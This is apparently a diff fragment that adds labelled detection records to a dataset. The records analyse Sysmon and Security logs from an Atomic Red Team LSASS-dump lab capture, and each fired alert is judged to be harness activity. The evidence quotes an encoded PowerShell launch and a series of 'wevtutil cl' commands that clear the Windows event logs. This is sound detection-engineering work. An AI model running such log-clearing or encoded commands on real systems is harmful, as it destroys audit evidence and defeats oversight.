+      "RecordNumber 5848 (also 2637, 2699, 4705, 4953, 5301, 5502, 9226): Sysmon 1, Image C:\\Windows\\System32\\cmd.exe (OriginalFileName Cmd.Exe), ParentImage C:\\Windows\\System32\\winrshost.exe, CommandLine 'C:\\Windows\\system32\\cmd.exe /C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCom...', User ATTACKRANGE\\Administrator"
+     ],
+     "reason": "cmd.exe started by winrshost.exe matches susp_shell (8 events, the only children of a WinRM host in the file), but these are the lab's Ansible WinRM (winrs) connection wrappers that deliver Invoke-AtomicTest; the scheduled-task tests start nothing under the WinRM host themselves."
+    }
+   ]
+  },
+  {
+   "label": "H105",
+   "dataset": "splunk/T1003.001/atomic_red_team/procdump_t1003.001_capattack/Microsoft-Windows-Sysmon-Operational.evtx",
+   "sha256": "3ed28b9348498dd694eb1b478e312594893c3ad505c8276ebf90ca062bc744ed",
+   "member_sha256": "1bace6bea924430db1e9555ce7895b64b46d356198bce85ea87bf97681a1d7fb",
+   "summary": "Sysmon log (54 events within 0.8 s, 2022-08-31 19:18:42) of a SnapAttack capattack session on win-host-mhaag-attack-range-117 that records only harness start-up: Sysmon reloaded with C:\\Users\\Administrator\\capattack\\sysmon_snapattack.xml, tshark/dumpcap starting the packet capture, and the harness PowerShell (PID 3212) archiving capattack\\stdout.txt/stderr.txt and setting PromptOnSecureDesktop=0. The procdump LSASS dump named by the upstream file is not recorded: no procdump process, none of the 20 EID 10 events targets lsass.exe (lsass.exe is only the source of two 0x1000 accesses to PowerShell), and the EID 13 writes are Sysmon parameters and a UAC policy, not Run keys. So no detection has an in-scope event, and T1003.001 gets no label because the attack is absent from the capture, not because of a documented gap.",
+   "labels": []
+  },
+  {
+   "label": "H106",
+   "dataset": "splunk/T1003.001/atomic_red_team/procdump_t1003.001_capattack/Security.evtx",
+   "sha256": "3ed28b9348498dd694eb1b478e312594893c3ad505c8276ebf90ca062bc744ed",
+   "member_sha256": "10156c3115cff2cfa7eb11fbbbb861dde1546e459136a8e87aad8db7450f3c5f",
+   "summary": "Security log (92 events within 67 ms) of the same capattack capture: the harness PowerShell (ProcessId 0xc8c = 3212, the process that manages the capattack folder in H105) runs wevtutil cl over the event logs in alphabetical order (15 x 4688, plus 61 x 4703 SeSecurity/SeBackup privilege toggles), ending with Security, which writes 1102. No procdump process creation is recorded, so the LSASS dump itself is not in this file. The System 104 events for the other cleared logs would be in the System log, which is not part of the capture's files here.",
+   "labels": [
+    {
+     "detection": "T1070.001_event_log_clearing",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 2786399: Security 4688, NewProcessName C:\\Windows\\System32\\wevtutil.exe, CommandLine '\"C:\\Windows\\system32\\wevtutil.exe\" cl \"Security\"', ParentProcessName ...\\WindowsPowerShell\\v1.0\\powershell.exe, ProcessId 0xc8c, SubjectUserName Administrator, SubjectLogonId 0xe7a0c",
+      "EventRecordIDs 2786315, 2786321, 2786327, 2786331, 2786339, 2786345, 2786351, 2786357, 2786363, 2786369, 2786375, 2786381, 2786387, 2786390: Security 4688 from the same parent, 'wevtutil.exe cl \"Microsoft-Windows-ntshrui-perf\"' ... 'cl \"SMSApi\"' (an alphabetical walk of the log list)",
+      "Paired Sysmon log H105: PID 3212 (= 0xc8c) is powershell.exe archiving C:\\Users\\Administrator\\capattack\\stdout.txt and stderr.txt (EventRecordIDs 40892363-40892364) right after Sysmon is reloaded with the capattack config and the packet capture starts"
+     ],
+     "reason": "wevtutil cl matched by path (selection_wevtutil), read from Security 4688 with command lines, which the telemetry section allows; no documented filter applies, so an alert is expected. The clearing is the SnapAttack capattack harness wiping every log before it reconfigures Sysmon and starts recording, not the procdump attack: test-harness activity."
+    },
+    {
+     "detection": "T1070.001_security_log_cleared",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 2786312: Security 1102 (provider Microsoft-Windows-Eventlog), SubjectUserName Administrator, SubjectLogonId 0xe7a0c, TimeCreated 2022-08-31 19:18:41.742",
+      "EventRecordID 2786399: Security 4688 'wevtutil.exe cl \"Security\"' from the harness PowerShell (ProcessId 0xc8c) at 19:18:41.739"
+     ],
+     "reason": "Security 1102 is the single event the rule keys on, with nothing to filter, so it fires. The Security log was cleared by the capattack harness while preparing the capture (same logon session 0xe7a0c as the wevtutil loop), so the alert is harness activity, not attack evidence."
+    }
+   ]
+  }
+ ]
+}
